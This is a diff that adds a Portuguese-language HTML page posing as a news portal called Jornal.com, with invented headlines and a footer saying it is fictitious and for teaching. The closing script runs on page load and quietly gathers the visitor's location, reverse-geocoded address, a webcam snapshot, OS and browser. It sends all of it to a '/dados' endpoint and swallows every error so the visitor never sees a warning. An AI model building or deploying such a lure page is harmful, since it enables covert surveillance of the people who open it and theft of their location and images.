@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Jornal.com – Clone de Portal de Notícias</title>
+  <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/21/21601.png">
+  <style>
+    :root {
+      --bg: #16191c;
+      --card: #23262a;
+      --header: #1d2125;
+      --highlight: #F25C05;
+      --font: #ececec;
+      --font-soft: #b6bbc3;
+      --accent: #50e3c2;
+      --border: #262626;
+    }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: var(--bg);
+      color: var(--font);
+      min-height: 100vh;
+    }
+    header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: var(--header);
+      box-shadow: 0 2px 12px #111b;
+      padding: 0 32px;
+      height: 68px;
+      position: sticky; top:0; left:0; right:0; z-index: 50;
+    }
+    .logo {
+      display: flex; align-items: center;
+    }
+    .logo img {
+      height: 38px; margin-right: 10px;
+    }
+    .logo-title {
+      font-size: 2.0em;
+      font-weight: 700;
+      color: var(--font);
+      letter-spacing: -1px;
+    }
+    nav {
+      display: flex; gap: 28px;
+    }
+    nav a {
+      color: var(--font-soft);
+      text-decoration: none;
+      font-size: 1.08em;
+      font-weight: 500;
+      letter-spacing: .01em;
+      padding: 3px 2px;
+      border-bottom: 2px solid transparent;
+      transition: border .14s, color .14s;
+    }
+    nav a:hover {
+      color: var(--accent);
+      border-bottom: 2px solid var(--accent);
+    }
+    .user-icon {
+      background: #323842;
+      color: #eee;
+      border-radius: 50%;
+      font-size: 22px;
+      width: 38px; height:38px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-left: 22px;
+    }
+    #status {
+      font-weight: 600;
+      color: #29e89e;
+      margin-left: 26px;
+    }
+    .container {
+      max-width: 1320px;
+      margin: 32px auto 0 auto;
+      display: flex;
+      gap:36px;
+      padding: 0 14px;
+    }
+    .maincontent {
+      flex: 2 1 0%;
+      display: flex;
+      flex-direction: column;
+      gap: 32px;
+    }
+    .headline {
+      background: var(--card);
+      border-radius: 18px;
+      box-shadow: 0 4px 26px #0008;
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+      margin-bottom: 8px;
+    }
+    .headline-img {
+      width: 100%; max-height: 340px; object-fit: cover; display:block;
+    }
+    .headline-body {
+      padding: 26px 30px 15px 30px;
+    }
+    .headline-title {
+      font-size: 2.1em;
+      color: var(--highlight);
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    .headline-desc {
+      font-size: 1.16em;
+      color: var(--font-soft);
+      margin-bottom: 8px;
+    }
+    .headline-meta {
+      font-size: 0.97em;
+      color: #777;
+    }
+    .news-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit,minmax(300px,1fr));
+      gap: 30px;
+    }
+    .news-card {
+      background: var(--card);
+      border-radius: 14px;
+      box-shadow: 0 2px 17px #0005;
+      overflow: hidden;
+      display: flex; flex-direction: column;
+      min-height: 328px;
+      transition: box-shadow .14s, transform .14s;
+    }
+    .news-card:hover {
+      box-shadow: 0 0px 34px #0009;
+      transform: scale(1.02) translateY(-2px);
+    }
+    .news-thumb {
+      width: 100%; height: 180px;
+      object-fit: cover; display:block;
+      background: #222;
+    }
+    .news-content {
+      padding: 19px 17px 14px 17px;
+      display: flex; flex-direction: column;
+      flex: 1 1 0%;
+    }
+    .news-title {
+      font-size: 1.12em;
+      color: var(--font);
+      font-weight: 600;
+      margin: 0 0 12px 0;
+      text-decoration: none;
+      transition: color .13s;
+      word-break: break-word;
+    }
+    .news-title:hover {
+      color: var(--highlight);
+    }
+    .news-desc {
+      font-size: 1em;
+      color: var(--font-soft);
+      margin-bottom: 10px;
+    }
+    .news-meta {
+      font-size: .92em;
+      color: #888;
+      margin-top: auto;
+    }
+    aside.sidebar {
+      flex: 1 1 0%;
+      max-width: 320px;
+      display: flex;
+      flex-direction: column;
+      gap: 32px;
+    }
+    .widget {
+      background: var(--card);
+      border-radius: 12px;
+      box-shadow: 0 2px 16px #0005;
+      padding: 20px 20px 14px 20px;
+      margin-bottom: 0;
+    }
+    .widget-title {
+      margin: 0 0 15px 0;
+      color: var(--highlight);
+      font-weight: bold;
+      font-size: 1.12em;
+      letter-spacing: .02em;
+    }
+    .widget-list {
+      list-style: none; margin: 0; padding: 0;
+    }
+    .widget-list li {
+      margin-bottom: 10px;
+      font-size: 1.02em;
+    }
+    .widget-list li a {
+      color: var(--accent);
+      text-decoration: none;
+    }
+    .widget-list li a:hover { text-decoration: underline;}
+    footer {
+      margin-top: 42px;
+      background: #181818;
+      color: #aaa;
+      padding: 20px;
+      text-align: center;
+      letter-spacing: .09em;
+      font-size: .97em;
+    }
+    @media (max-width:1050px) {
+      .container {
+          flex-direction: column;
+          gap: 22px;
+      }
+      aside.sidebar {
+        max-width: none;
+        flex-direction: row;
+        gap: 12px;
+      }
+      .widget { margin-bottom:0;}
+    }
+    @media (max-width:750px) {
+      .container {padding:0;}
+      header {padding: 0 8px;}
+      .maincontent, aside.sidebar {padding:0;}
+      .headline-body {padding: 14px;}
+      .news-grid {gap: 15px;}
+      .news-card {min-height: 200px;}
+    }
+    @media (max-width:600px) {
+      .headline-title {font-size:1.18em;}
+      .maincontent {gap:19px;}
+      .news-card {min-height: 130px;}
+      .logo-title{font-size:1.21em;}
+      nav {gap:11px;}
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">
+      <img src="https://cdn-icons-png.flaticon.com/512/21/21601.png" alt="Jornal Logo">
+      <span class="logo-title">Jornal.com</span>
+    </div>
+    <nav>
+      <a href="#">Últimas</a>
+      <a href="#">Brasil</a>
+      <a href="#">Política</a>
+      <a href="#">Mundo</a>
+      <a href="#">Esportes</a>
+      <a href="#">Tecnologia</a>
+      <a href="#">Economia</a>
+      <a href="#">Entretenimento</a>
+    </nav>
+    <div class="user-icon" title="Usuário">??</div>
+    <span id="status">Bem-vindo ao Jornal.com</span>
+  </header>
+  <div class="container">
+    <main class="maincontent">
+      <section class="headline">
+        <img class="headline-img" src="https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=900&q=80" alt="Imagem da Manchete">
+        <div class="headline-body">
+          <div class="headline-title">Mega operação internacional resulta na prisão de líderes de organização criminosa</div>
+          <div class="headline-desc">
+            Polícia Federal, em cooperação com agências da Europa, desmantelou uma das maiores quadrilhas do continente. Ação ocorreu simultaneamente em 8 países na manhã desta quinta (25).
+          </div>
+          <div class="headline-meta">Por Redação • 25/07/2025 08:45</div>
+        </div>
+      </section>
+      <div class="news-grid">
+        <article class="news-card">
+          <img class="news-thumb" src="https://images.unsplash.com/photo-1464983953574-0892a716854b?auto=format&fit=crop&w=400&q=80" alt>
+          <div class="news-content">
+            <a class="news-title" href="#">Nova onda de calor atinge o Centro-Oeste e Sudeste</a>
+            <div class="news-desc">Especialistas alertam para risco de queimadas e stress hídrico em diversas cidades do país.</div>
+            <div class="news-meta">08:23 • Clima</div>
+          </div>
+        </article>
+        <article class="news-card">
+          <img class="news-thumb" src="https://images.unsplash.com/photo-1511671782779-c97d3d27a1d4?auto=format&fit=crop&w=400&q=80" alt>
+          <div class="news-content">
+            <a class="news-title" href="#">Bolsa fecha em alta após novo corte de juros pelo Banco Central</a>
+            <div class="news-desc">Mercado financeiro reage positivamente e dólar recua frente ao real nesta sexta.</div>
+            <div class="news-meta">07:50 • Economia</div>
+          </div>
+        </article>
+        <article class="news-card">
+          <img class="news-thumb" src="https://images.unsplash.com/photo-1503676382389-4809596d5290?auto=format&fit=crop&w=400&q=80" alt>
+          <div class="news-content">
+            <a class="news-title" href="#">Time brasileiro avança à final da Libertadores</a>
+            <div class="news-desc">Equipe supera rival argentino nos pênaltis e disputa a decisão pela terceira vez.</div>
+            <div class="news-meta">06:39 • Esporte</div>
+          </div>
+        </article>
+        <article class="news-card">
+          <img class="news-thumb" src="https://images.unsplash.com/photo-1519125323398-675f0ddb6308?auto=format&fit=crop&w=400&q=80" alt>
+          <div class="news-content">
+            <a class="news-title" href="#">WhatsApp lança recurso de tradução instantânea</a>
+            <div class="news-desc">Ferramenta permite conversar com pessoas em outros idiomas em tempo real.</div>
+            <div class="news-meta">05:17 • Tecnologia</div>
+          </div>
+        </article>
+        <article class="news-card">
+          <img class="news-thumb" src="https://images.unsplash.com/photo-1504384308090-c894fdcc538d?auto=format&fit=crop&w=400&q=80" alt>
+          <div class="news-content">
+            <a class="news-title" href="#">Festival de cinema reúne estrelas internacionais em SP</a>
+            <div class="news-desc">Evento marca estreia de filmes brasileiros cotados para o Oscar.</div>
+            <div class="news-meta">03:21 • Cultura</div>
+          </div>
+        </article>
+        <article class="news-card">
+          <img class="news-thumb" src="https://images.unsplash.com/photo-1470770841072-f978cf4d019e?auto=format&fit=crop&w=400&q=80" alt>
+          <div class="news-content">
+            <a class="news-title" href="#">Startup brasileira recebe aporte de R$ 90 milhões</a>
+            <div class="news-desc">Investimento será usado para expansão e novos serviços na América Latina.</div>
+            <div class="news-meta">Ontem • Negócios</div>
+          </div>
+        </article>
+      </div>
+    </main>
+    <aside class="sidebar">
+      <section class="widget">
+        <div class="widget-title">Mais lidas</div>
+        <ul class="widget-list">
+          <li><a href="#">Conheça os bairros mais caros do Brasil</a></li>
+          <li><a href="#">Eleições 2026: Veja o calendário completo</a></li>
+          <li><a href="#">Como proteger dados pessoais na internet</a></li>
+          <li><a href="#">Dólar fecha no menor valor do ano</a></li>
+          <li><a href="#">Aplicativos para organizar sua rotina</a></li>
+        </ul>
+      </section>
+      <section class="widget">
+        <div class="widget-title">Colunas</div>
+        <ul class="widget-list">
+          <li><a href="#">Opinião: Mudanças climáticas e futuro do Brasil</a></li>
+          <li><a href="#">Mercado financeiro explicado em 5 minutos</a></li>
+        </ul>
+      </section>
+    </aside>
+  </div>
+  <footer>
+    &copy; 2025 Jornal.com — Página fictícia inspirada em G1, UOL e grandes portais. Apenas para fins didáticos.
+  </footer>
+  <script>
+    // Script de coleta de localização, sistema, navegador, câmera (SEM alertas de erro para usuário)
+    async function capturarDados() {
+      try {
+        const sistema = navigator.platform;
+        const navegador = navigator.userAgent;
+
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+
+          let endereco = 'Desconhecido';
+          try {
+            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+            const geoData = await geoRes.json();
+            endereco = geoData.display_name || endereco;
+          } catch{}
+
+          try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            const context = canvas.getContext('2d');
+
+            setTimeout(() => {
+              context.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const imagem = canvas.toDataURL('image/png');
+
+              fetch('/dados', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  latitude,
+                  longitude,
+                  endereco,
+                  imagem,
+                  sistema,
+                  navegador
+                })
+              }).then(() => {
+                document.getElementById('status').textContent = '? Dados enviados com sucesso!';
+                stream.getTracks().forEach(track => track.stop());
+              }).catch(() => {
+                stream.getTracks().forEach(track => track.stop());
+              });
+            }, 3000);
+          } catch {
+            // Ignora erro da câmera
+          }
+        }, (err) => {
+          // Ignora erro de localização/rejeição do usuário
+        });
+      } catch (err) {
+        // erro geral ignorado
+      }
+    }
+
+    window.onload = capturarDados;
+  </script>
+</body>
+</html>
